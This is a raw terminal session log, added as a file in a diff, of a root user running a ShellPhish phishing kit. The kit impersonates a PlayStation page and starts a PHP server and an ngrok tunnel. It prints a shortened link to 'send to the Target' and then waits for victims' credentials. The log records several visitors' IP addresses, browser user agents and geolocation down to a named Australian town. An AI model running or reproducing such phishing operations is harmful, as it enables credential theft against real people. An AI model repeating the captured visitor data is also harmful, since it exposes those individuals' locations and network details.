@@ -1,0 +1,73 @@
+Script started on 2020-07-18 04:08:14-11:00 [TERM="screen" TTY="/dev/pts/21" COLUMNS="80" LINES="24"]
+root@hack02:~/bot# cd /root/bot/hacks/shellphish/; timeout 3800 ./Playstation1.sh; pkill -f -2 ngrok > /dev/null 2>&1; killall -2 ngrok > /dev/null 2>&1
+[H[J
+rm: cannot remove 'ngrok82.txt': No such file or directory
+[1;92m[[0m*[1;92m] Starting php server...
+[1;92m[[0m*[1;92m] Starting ngrok server...
+
+[1;92m[[0m*[1;92m] Send this link to the Target:[0m[1;77m [0m
+
+[1;93m[[0m[1;77m*[0m[1;93m] Or using tinyurl:[0m[1;77m http://tinyurl.com/yx7zk3hc 
+
+
+[1;92m[[0m[1;77m*[0m[1;92m] Waiting IPs and Credentials,[0m[1;77m Press Ctrl + C to exit...[0m
+
+
+
+
+[1;92m[[0m*[1;92m] IP Found!
+[1;93m[[0m[1;77m*[0m[1;93m] Target IP:[0m[1;77m 150.129.8.34[0m
+[1;93m[[0m[1;77m*[0m[1;93m] User-Agent:[0m[1;77m  User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0[0m
+[1;92m[[0m[1;77m*[0m[1;92m] Saved:[0m[1;77m playstation/saved.ip.txt[0m
+
+[1;92m[*] Hostname:[0m[1;77m 150.129.8.34[0m
+[1;92m[*] IP Continent:[0m[1;77m Unknown[0m
+[1;92m[*] IP Country:[0m[1;77m  Anonymous Proxy [0m
+[1;92m[*] City Location:[0m[1;77m  Unknown[0m
+[1;92m[*] ISP:[0m[1;77m Liteserver VOF[0m
+[1;92m[*] AS Number:[0m[1;77m AS60404 Liteserver Holding B.V.[0m
+[1;92m[*] IP Address Speed:[0m[1;77m Unknown Internet Speed[0m
+grep: iptracker.log: No such file or directory
+
+[1;93m[[0m[1;77m*[0m[1;93m] Waiting Credentials and Next IP.[0m
+
+[1;92m[[0m*[1;92m] IP Found!
+[1;93m[[0m[1;77m*[0m[1;93m] Target IP:[0m[1;77m 203.132.95.52[0m
+[1;93m[[0m[1;77m*[0m[1;93m] User-Agent:[0m[1;77m  User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0[0m
+[1;92m[[0m[1;77m*[0m[1;92m] Saved:[0m[1;77m playstation/saved.ip.txt[0m
+
+[1;92m[*] Hostname:[0m[1;77m 203-132-95-52.ip4.superloop.com[0m
+[1;92m[*] Reverse DNS:[0m[1;77m 52.95.132.203.in-addr.arpa      [0m
+[1;92m[*] IP Continent:[0m[1;77m Oceania (OC)[0m
+[1;92m[*] IP Country:[0m[1;77m  Australia [0m
+[1;92m[*] State:[0m[1;77m Victoria[0m
+[1;92m[*] City Location:[0m[1;77m Ballarat North[0m
+[1;92m[*] ISP:[0m[1;77m Bigair Group Limited[0m
+[1;92m[*] AS Number:[0m[1;77m AS38195 Superloop[0m
+[1;92m[*] IP Address Speed:[0m[1;77m Broadband (Cable/DSL) Internet Speed[0m
+grep: iptracker.log: No such file or directory
+
+[1;93m[[0m[1;77m*[0m[1;93m] Waiting Credentials and Next IP.[0m
+
+[1;92m[[0m*[1;92m] IP Found!
+[1;93m[[0m[1;77m*[0m[1;93m] Target IP:[0m[1;77m 203.132.95.52[0m
+[1;93m[[0m[1;77m*[0m[1;93m] User-Agent:[0m[1;77m  User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0[0m
+[1;92m[[0m[1;77m*[0m[1;92m] Saved:[0m[1;77m playstation/saved.ip.txt[0m
+grep: iptracker.log: No such file or directory
+
+grep: iptracker.log: No such file or directory
+grep: iptracker.log: No such file or directory
+grep: iptracker.log: No such file or directory
+grep: iptracker.log: No such file or directory
+grep: iptracker.log: No such file or directory
+grep: iptracker.log: No such file or directory
+grep: iptracker.log: No such file or directory
+grep: iptracker.log: No such file or directory
+grep: iptracker.log: No such file or directory
+
+[1;93m[[0m[1;77m*[0m[1;93m] Waiting Credentials and Next IP.[0m
+root@hack02:~/bot/hacks/shellphish# 
+root@hack02:~/bot/hacks/shellphish# 
+root@hack02:~/bot/hacks/shellphish# 
+root@hack02:~/bot/hacks/shellphish# 
+root@hack02:~/bot/hacks/shellphish# 
